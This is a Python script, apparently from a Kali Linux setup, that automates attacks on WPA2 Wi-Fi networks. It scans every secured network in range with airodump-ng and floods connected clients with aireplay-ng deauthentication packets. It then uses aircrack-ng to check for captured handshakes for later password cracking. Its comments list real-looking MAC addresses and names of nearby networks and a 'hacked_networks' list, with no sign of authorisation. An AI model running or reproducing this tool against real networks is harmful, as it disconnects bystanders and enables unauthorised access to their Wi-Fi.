from os import system
import subprocess
from pathlib import Path
from time import sleep
import pandas, io
import builtins

from copy import deepcopy



system("bash enableMonitorMode.sh")
system("bash setupWifiCard.sh") # you don't need 'wlan0mon' if you aren't using fern

wifiNetworkSSID = "luba"

hacked_networks = [
    # "SKY-NET",
    # "luba",
    # "Home",
    # "TP-LINK_34E3C0",
    # "TP-LINK_Guest_8F28",
    # "TP-LINK_Guest_8F28_5G"
    # "dlink",
]

with open("log.txt", "w") as log:
    log.write("")

old_print = deepcopy(print)


def print_and_log_to_file(*args, **kwargs):
    old_print(*args, **kwargs)
    with open("log.txt", "a") as log:
        log.write(" ".join(map(str, args)) + "\n")


builtins.print = print_and_log_to_file


process_for_capturing_packets, process_for_capturing_confirmation = None, None

# def spray_clients_with_death_requests():

def kill_all_airodump_ng_processes(): # and aireplay
    system('killall -r "airodump*"')
    system('killall -r "aireplay*"')

kill_all_airodump_ng_processes()

def captureHandshake__parse_from_string(stringWparams, client_MAC, timeout = 10, time_to_gather_clients = 15):
    # 74:DA:88:1C:24:10  -59        7        0    0  36  390   WPA2 CCMP   PSK  5GHOME

    fields = map(lambda field: field.strip(), stringWparams.split(" "))
    fields = list(fields)

    fields = list(filter(bool, fields))    

    networkSSID = fields[-1]
    networkMAC = fields[0]
    channel = int(fields[5])


    return captureHandshake(networkSSID, networkMAC, client_MAC, channel, timeout, time_to_gather_clients = time_to_gather_clients)

def captureHandshake(networkSSID, networkMAC, client_MAC, channel, timeout = 10, kill_processes = True, start_processes = True, time_to_gather_clients = 15):
    # observeNetwork(networkSSID, channel, observe_for)
    print(f"Capturing handshakes on {networkSSID}")
    command_to_capture_packets = f"airodump-ng wlan0mon --essid {networkSSID} -w {networkSSID}-packets -a {'--channel ' + str(channel) if channel else ''  }"
    # command_to_capture_confirmation = f"airodump-ng wlan0mon --essid {networkSSID} {'--channel ' + str(channel) if channel else ''} "

    if start_processes:
        system("rm observ*")
        system(f"rm {networkSSID}-packets*")

        global process_for_capturing_packets, process_for_capturing_confirmation

        process_for_capturing_packets = subprocess.Popen(command_to_capture_packets.split(" "), text = True)
        # process_for_capturing_confirmation = subprocess.Popen(command_to_capture_confirmation, text = True, shell = True)


    if not client_MAC:
        clients = get_all_clients(networkSSID, channel, time_per_network=time_to_gather_clients, start_process = False, stop_process = False)
        for client, power in clients:
            deauth_client(networkMAC, client, channel)
            attack_interval = 10
            sleep(attack_interval)

    else:
        deauth_client(networkMAC, client_MAC, channel)

    

    sleep(timeout)
    wpa_handshake = result = check_packets_file_for_handshake(f"{networkSSID}-packets-01.cap")

    if result:
        print(f"Got WPA handshake on {networkSSID}. Refer to packets.")
    else:
        print(f"No WPA handshake from client {client_MAC}")


    if kill_processes:
        process_for_capturing_packets.kill()
        # process_for_capturing_confirmation.kill()

    return result
    # /media/sf_shared_folder/

def captureHandshakes():
    networks, clients = get_networks(observe_for=30, get_clients=True)

    last_network = None

    for index, client_row in clients.iterrows():
        name = client_row[' ESSID'][1:]

        if name in hacked_networks:
            continue

        mac_address = client_row['BSSID']
        channel = client_row[' channel']
        # system(f"sudo iwconfig wlan0mon channel {channel}")

        # clients = get_all_clients(name, channel, time_per_network = 45) # time_per_network means time to observe. A fuck up here
        client = client_row["Station MAC"]
        
        if last_network == None:
            result = captureHandshake(name, mac_address, client, channel, kill_processes = False, start_processes = True)

        elif last_network == name:
            result = captureHandshake(name, mac_address, client, channel, kill_processes = False, start_processes = False)
        else:
            process_for_capturing_packets.kill()
            result = captureHandshake(name, mac_address, client, channel, kill_processes = False, start_processes = True)

        # if result:
        #     break

        last_network = name




def observeNetwork(networkSSID, channel = None, observe_for = 0, stopword = None, start_process = True, stop_process = False):
    # sudo airodump-ng wlan0monmon | grep SKY-NET | cut -d " " -f 2
    # bashCMDtoRun = rf"""airodump-ng wlan0mon | grep {networkSSID} | cut -d " " -f 2 > airodump-ng-output.txt"""
    # bashCMDtoRun = ["airodump-ng", "wlan0mon", "|",  "grep",  f"{networkSSID}", "|", "cut", '-d " "', "-f", "2", "|", "echo done"] # , 
    bashCMDtoRun = ["airodump-ng", "wlan0mon"] # , 
    # bashCMDtoRun = rf"""airodump-ng wlan0mon > airodump-ng-output.txt"""
    shebang = "#!/bin/bash\n"

    # with open('temp.sh', 'w') as sh_temp:
    #     sh_temp.write(shebang + bashCMDtoRun)

    # airodump works, but, it seems that it doesn't output to stdout or something, cause .check_output doesn't report anything
    # if I add echo to the end of .sh script, it returns a newline

    # results = subprocess.check_output([r'/home/kali/dev/temp.sh'])
    # bashCMDtoRunString = " ".join(bashCMDtoRun)
    if start_process:
        system("rm observ*.csv")
        bashCMDtoRunString = f"airodump-ng wlan0mon --output-format csv --essid {networkSSID} -w {networkSSID}-packets -a {'--channel ' + str(channel) if channel else ''  }"
        print("cmd to run:", bashCMDtoRunString)

        process = subprocess.Popen(bashCMDtoRunString.split(" "), text = True)
    
    sleep(observe_for)
    output = wait_untill_file_exists_and_read_it(f'/home/kali/dev/{networkSSID}-packets-01.csv')
    while networkSSID not in output and (stopword not in output if stopword else True):
        output = wait_untill_file_exists_and_read_it(f'/home/kali/dev/{networkSSID}-packets-01.csv')
    
    if stop_process:
        process.kill()

    output__lines = output.split('\n')
    ap_data = output__lines[1: 3]
    client_data = output__lines[4:]
    client_data = list(filter(lambda line: "not associated" not in line, client_data))

    ap_data_dataframe = pandas.read_csv(io.StringIO("\n".join(ap_data)))
    bssid = ap_data_dataframe['BSSID'][0]

    client_data_dataframe = pandas.read_csv(io.StringIO("\n".join(client_data)))
    associated_clients = client_data_dataframe[' BSSID'] == " " + bssid
    client_data_dataframe = client_data_dataframe[associated_clients]

    
    clients = list(client_data_dataframe['Station MAC'])
    clients__distances = list(client_data_dataframe[' Power'])
    observations = {
        "BSSID": bssid,
        "CHANNEL": ap_data_dataframe[" channel"][0],
        "CLIENTS": list(zip(clients, clients__distances))
    }
    return observations

    # airodump-ng-output.txt
    # airodump-ng wlan0mon --output-format csv --essid SKY-NET -w observ -a
    # WPA handshake

def get_networks(observe_for = 15, get_clients = False):
    command_to_run = "airodump-ng wlan0mon --output-format csv -w all_networks -a"
    system("rm all_networks*")

    process = subprocess.Popen(command_to_run.split(" "), text = True)
    sleep(observe_for)
    process.kill()

    output = wait_untill_file_exists_and_read_it('/home/kali/dev/all_networks-01.csv')
    output = output.split("\n\n") 
    
    output__clients = output[1]
    output__clients = list(filter(lambda line: "not associated" not in line, output__clients.split("\n")))

    
    
    output = output[0][1:] # selecting networks info (ommiting clients) and discarging first line
    # output = "\n".join(output_lines)

    networks_dataframe = pandas.read_csv(io.StringIO(output))
    clients_dataframe = pandas.read_csv(io.StringIO("\n".join(output__clients)))
    clients_dataframe = clients_dataframe.rename(columns={" BSSID": "BSSID"})
    clients_dataframe["BSSID"] = clients_dataframe["BSSID"].map(lambda bssid: bssid[1:])


    networks_with_name = networks_dataframe[" ESSID"] != " "
    networks_dataframe = networks_dataframe[networks_with_name]

    nonopen_networks = networks_dataframe[" Privacy"] != " OPN"
    networks_dataframe = networks_dataframe[nonopen_networks]
    
    networks_with_stated_security = networks_dataframe[" Privacy"] != " "
    networks_dataframe = networks_dataframe[networks_with_stated_security]
    # networks_dataframe = networks_dataframe[nonopen_networks][networks_with_stated_security][networks_with_name]

    networks_dataframe = networks_dataframe.sort_values(by =" Power", ascending = False)

    clients_dataframe = associate_networks_SSID_with_their_BSSID(clients_dataframe, networks_dataframe)
    clients_dataframe = clients_dataframe.sort_values(by = " ESSID", ascending = False)


    if not get_clients:
        return networks_dataframe

    return networks_dataframe, clients_dataframe

def associate_networks_SSID_with_their_BSSID(src_dataframe, associations_dataframe):
    # BSSIDS = list(src_dataframe[" BSSID"])
    # SSIDS = map(lambda BSSID: , BSSIDS)
    associations_dataframe = associations_dataframe[["BSSID", " ESSID", " channel"]]
    src_dataframe = pandas.merge(src_dataframe, associations_dataframe, how = "inner", on = ["BSSID"])

    return src_dataframe


def get_clients():
    pass

def obtainMACbySSID(networkSSID):
    observations = observeNetwork(networkSSID)
    return observations["BSSID"]

def get_all_clients(networkSSID, channel = None, time_per_network = 0, start_process = True, stop_process = True):
    print(f"Getting all clients of {networkSSID}")
    observations = observeNetwork(networkSSID, channel, time_per_network, start_process, stop_process)
    return observations["CLIENTS"]



def deauth_client(network_MAC, client_MAC, network_channel = 1):
    print(f"Deauthenticating client of {network_MAC}")

    # system(f"sudo iwconfig wlan0mon channel {network_channel}")
    number_of_deauth_packets_to_send = 10
    command = f"aireplay-ng --deauth {number_of_deauth_packets_to_send} -a {network_MAC} -c {client_MAC} wlan0mon"
    
    process = subprocess.Popen(command.split(" "), text = True)
    sleep(number_of_deauth_packets_to_send / 2)

    attack_stopper = lambda: process.kill()

    return attack_stopper


def wait_untill_file_exists_and_read_it(path_to_file, delete_contents_after_reading = False):

    while not Path(path_to_file).exists():
        sleep(.1)

    with open(path_to_file, "r") as file_:
        contens = file_.read()
        

    if delete_contents_after_reading:
        with open(path_to_file, "w") as file_:
            file_.write('')
        
    return contens

def check_packets_file_for_handshake(path_to_file):

    try:

        aircrack_response = subprocess.check_output(f"aircrack-ng {path_to_file}".split(" ")).decode()
    except Exception as e:
        print(f'several networks in one file ({path_to_file}). Check manually')
        return False

    # print(aircrack_response)
    if "handshake" in aircrack_response and "0 handshake" not in aircrack_response:
        return True

    return False


# observeNetwork(wifiNetworkSSID, channel = 11, observe_for = 90)
# deauth_client(network_MAC = "EC:08:6B:83:8F:27", client_MAC = "D8:CE:3A:31:39:84", network_channel = 11)
# captureHandshake("5GHOME", "74:DA:88:1C:24:10", client_MAC = None, channel = 36, time_to_gather_clients=45)
# captureHandshake__parse_from_string(
#     " EC:08:6B:83:8F:27  -46       43        4    0   1  195   WPA2 CCMP   PSK  SKY-NET",
#     client_MAC = None, time_to_gather_clients=45)
# get_networks(30)
captureHandshakes()
# check_packets_file_for_handshake("luba-packets-01.cap")
# 04:5E:A4:CB:1B:27  -62      660       20    0   5  270   WPA2 CCMP   PSK  netis_CB1B27
# 74:DA:88:1C:24:10  -59        7        0    0  36  390   WPA2 CCMP   PSK  5GHOME
# 78:44:76:F2:34:10  -46      319       87    0   1  270   WPA2 CCMP   PSK  Andriy
#  74:DA:88:1C:24:11  -31      296        0    0   3  270   WPA2 CCMP   PSK  Guests
#  7C:8B:CA:AF:2D:9B  -67        7        0    0   2   65   WPA2 CCMP   PSK  UKrtelecom_AF2D9B
#  74:DA:88:1C:24:10  -56       34        8    0  36  390   WPA2 CCMP   PSK  5GHOME


kill_all_airodump_ng_processes()
